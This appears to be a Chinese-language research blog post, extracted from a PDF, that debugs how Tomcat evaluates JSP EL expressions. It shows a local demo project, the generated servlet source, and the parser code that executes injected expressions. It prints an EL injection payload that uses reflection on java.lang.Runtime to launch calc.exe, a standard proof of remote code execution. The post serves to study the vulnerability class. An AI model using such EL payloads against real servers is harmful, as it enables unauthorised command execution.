Tomcat中表达式动态执⾏Java代码调试
最近在看表达式注⼊的东⻄，漏洞根源归根结底，应该是Java表达式功能强⼤，⽀持执⾏我们
注⼊的Java代码，这⾥觉得有必要代码调试下。因为表达式解析引擎有很多，我这⾥就⽤
Tomcat重点了，它⾥⾯包含了jdk下的 javax.el
就以这个demo为例，idea起简单的Java Web项⽬，修改index.jsp即可，这⾥注意⼀下搭建环
境需要修改下web.xml,在默认情况，Servlet 2.4 / JSP 2.0(以上)⽀持 EL 表达式。且在
index.jsp头部需加上
效果如下
${pageContext.request.getSession().setAttribute("a",pageContext.request.ge
tClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invo
ke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invo
ke(null),'calc.exe'))}
1
1
2
3
4
Hello World!
5
${233*233}
6
7
${pageContext.request.getSession().setAttribute("a",pageContext.request.ge
tClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invo
ke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invo
ke(null),'calc.exe'))}
8
9
10
3
4
8
9
  Archetype Created Web Application
10
11
在分析之前我们先了解下JSP执⾏原理 index.jsp在执⾏时，Tomcat会将其变成index.java,我
本机路径保存在
C:\Users\Administrator\AppData\Local\JetBrains\IntelliJIdea2020.1\tomcat\Unnamed_e
l_jsp_demo\work\Catalina\localhost\el_jsp_demo_war\org\apache\jsp，打开后内容如下
/*
1
 * Generated by the Jasper component of Apache Tomcat
2
 * Version: Apache Tomcat/8.5.57
3
 * Generated at: 2020-12-15 09:34:50 UTC
4
 * Note: The last modified time of this file was set to
5
 *       the last modified time of the source file after
6
 *       generation to assist with modification tracking.
7
 */
8
package org.apache.jsp;
9
10
import javax.servlet.*;
11
import javax.servlet.http.*;
12
import javax.servlet.jsp.*;
13
14
public final class index_jsp extends org.apache.jasper.runtime.HttpJspBase
15
    implements org.apache.jasper.runtime.JspSourceDependent,
16
                 org.apache.jasper.runtime.JspSourceImports {
17
18
  private static final javax.servlet.jsp.JspFactory _jspxFactory =
19
          javax.servlet.jsp.JspFactory.getDefaultFactory();
20
21
  private static java.util.Map _jspx_depe
ndants;
22
23
  private static final java.util.Set _jspx_imports_packa
ges;
24
25
  private static final java.util.Set _jspx_imports_class
es;
26
27
  static {
28
    _jspx_imports_packages = new java.util.HashSet<>();
29
    _jspx_imports_packages.add("javax.servlet");
30
    _jspx_imports_packages.add("javax.servlet.http");
31
    _jspx_imports_packages.add("javax.servlet.jsp");
32
    _jspx_imports_classes = null;
33
  }
34
35
  private volatile javax.el.ExpressionFactory _el_expressionfactory;
36
  private volatile org.apache.tomcat.InstanceManager _jsp_instancemanager;
37
38
  public java.util.Map getDependants() {
39
    return _jspx_dependants;
40
  }
41
42
  public java.util.Set getPackageImports() {
43
    return _jspx_imports_packages;
44
  }
45
46
  public java.util.Set getClassImports() {
47
    return _jspx_imports_classes;
48
  }
49
50
  public javax.el.ExpressionFactory _jsp_getExpressionFactory() {
51
    if (_el_expressionfactory == null) {
52
      synchronized (this) {
53
        if (_el_expressionfactory == null) {
54
          _el_expressionfactory = _jspxFactory.getJspApplicationContext(ge
tServletConfig().getServletContext()).getExpressionFactory();
55
        }
56
      }
57
    }
58
    return _el_expressionfactory;
59
  }
60
61
  public org.apache.tomcat.InstanceManager _jsp_getInstanceManager() {
62
    if (_jsp_instancemanager == null) {
63
      synchronized (this) {
64
        if (_jsp_instancemanager == null) {
65
          _jsp_instancemanager = org.apache.jasper.runtime.InstanceManager
Factory.getInstanceManager(getServletConfig());
66
        }
67
      }
68
    }
69
    return _jsp_instancemanager;
70
  }
71
72
  public void _jspInit() {
73
  }
74
75
  public void _jspDestroy() {
76
  }
77
78
  public void _jspService(final javax.servlet.http.HttpServletRequest requ
est, final javax.servlet.http.HttpServletResponse response)
79
      throws java.io.IOException, javax.servlet.ServletException {
80
81
    final java.lang.String _jspx_method = request.getMethod();
82
    if (!"GET".equals(_jspx_method) && !"POST".equals(_jspx_method) && !"H
EAD".equals(_jspx_method) && !javax.servlet.DispatcherType.ERROR.equals(re
quest.getDispatcherType())) {
83
      response.sendError(HttpServletResponse.SC_METHOD_NOT_ALLOWED, "JSP 
只允许 GET、POST 或 HEAD。Jasper 还允许 OPTIONS");
84
      return;
85
    }
86
87
    final javax.servlet.jsp.PageContext pageContext;
88
    javax.servlet.http.HttpSession session = null;
89
    final javax.servlet.ServletContext application;
90
    final javax.servlet.ServletConfig config;
91
    javax.servlet.jsp.JspWriter out = null;
92
    final java.lang.Object page = this;
93
    javax.servlet.jsp.JspWriter _jspx_out = null;
94
    javax.servlet.jsp.PageContext _jspx_page_context = null;
95
96
97
    try {
98
      response.setContentType("text/html;charset=UTF-8");
99
      pageContext = _jspxFactory.getPageContext(this, request, response,
100
            null, true, 8192, true);
101
      _jspx_page_context = pageContext;
102
      application = pageContext.getServletContext();
103
      config = pageContext.getServletConfig();
104
      session = pageContext.getSession();
105
      out = pageContext.getOut();
106
      _jspx_out = out;
107
108
      out.write("\n");
109
      out.write("\n");
110
      out.write("\n");
111
      out.write("\n");
112
      out.write("Hello World!\n");
113
      out.write("\n");
114
      out.write("\n");
115
      out.write((java.lang.String) org.apache.jasper.runtime.PageContextIm
pl.proprietaryEvaluate("${pageContext.request.getSession().setAttribute(\"
a\",pageContext.request.getClass().forName('java.lang.Runtime').getMethod(
'exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').ge
116
org.apache.jasper.runtime.PageContextImpl.proprietaryEvaluate 为容器执⾏表达式⽅法，
我们直接在这个⽅法上下断点，这个类存在在tomcat中，所以我们开启⼀个tomcat_src项⽬
来调试，将我们jsp_calc项⽬打包成war放到tomcat_src项⽬中进⾏调试
调试环境已准备好
tMethod('getRuntime').invoke(null),'calc.exe'))}", java.lang.String.class,
 (javax.servlet.jsp.PageContext)_jspx_page_context, null));
      out.write('\n');
117
      out.write((java.lang.String) org.apache.jasper.runtime.PageContextIm
pl.proprietaryEvaluate("${233*233}", java.lang.String.class, (javax.servle
t.jsp.PageContext)_jspx_page_context, null));
118
      out.write("\n");
119
      out.write("\n");
120
      out.write("\n");
121
    } catch (java.lang.Throwable t) {
122
      if (!(t instanceof javax.servlet.jsp.SkipPageException)){
123
        out = _jspx_out;
124
        if (out != null && out.getBufferSize() != 0)
125
          try {
126
            if (response.isCommitted()) {
127
              out.flush();
128
            } else {
129
              out.clearBuffer();
130
            }
131
          } catch (java.io.IOException e) {}
132
        if (_jspx_page_context != null) _jspx_page_context.handlePageExcep
tion(t);
133
        else throw new ServletException(t);
134
      }
135
    } finally {
136
      _jspxFactory.releasePageContext(_jspx_page_context);
137
    }
138
  }
139
}
140
断点下到org.apache.jasper.runtime.PageContextImpl#proprietaryEvaluate，expression已
经被赋值为我们嘚payload
这⾥有个懒⼈⽅法，使⽤单步步过，然后看计算器折么时候弹出来，最终定位到
org.apache.el.parser.AstValue#getValue，查看变量，我们传⼊嘚Payload都被存在了
protected Node[] children中，Node嘚初始化是在
org.apache.el.ValueExpressionImpl#getNode中 
org.apache.el.lang.ExpressionBuilder#createNode
private static final Node createNodeInternal(String expr)
1
        throws ELException {
2
    if (expr == null) {
3
        throw new ELException(MessageFactory.get("error.null"));
4
    }
5
6
    Node n = expressionCache.get(expr);
7
    if (n == null) {
8
        ELParser parser = parserCache.pop();
9
        try {
10
            if (parser == null) {
11
                parser = new ELParser(new StringReader(expr));
12
            } else {
13
                parser.ReInit(new StringReader(expr));
14
            }
15
            n = parser.CompositeExpression();
16
17
            // validate composite expression
18
            int numChildren = n.jjtGetNumChildren();
19
            if (numChildren == 1) {
20
                n = n.jjtGetChild(0);
21
            } else {
22
                Class type = null;
23
                Node child = null;
24
                for (int i = 0; i < numChildren; i++) {
25
                    child = n.jjtGetChild(i);
26
                    if (child instanceof AstLiteralExpression)
27
                        continue;
28
                    if (type == null)
29
                        type = child.getClass();
30
                    else {
31
                        if (!type.equals(child.getClass())) {
32
                            throw new ELException(MessageFactory.get(
33
                                    "error.mixed", expr));
34
                        }
35
                    }
36
                }
37
            }
38
39
            if (n instanceof AstDeferredExpression
40
                    || n instanceof AstDynamicExpression) {
41
                n = n.jjtGetChild(0);
42
            }
43
            expressionCache.put(expr, n);
44
        } catch (Exception e) {
45
            throw new ELException(
46
                    MessageFactory.get("error.parseFail", expr), e);
47
        } finally {
48
            if (parser != null) {
49
                parserCache.push(parser);
50
            }
51
        }
52
    }
53
回到org.apache.el.parser.AstValue#getValue，这⾥是个重要⽅法 处理我们传⼊嘚数据  实现
了⼀个动态执⾏Java代码的环境
    return n;
54
}
55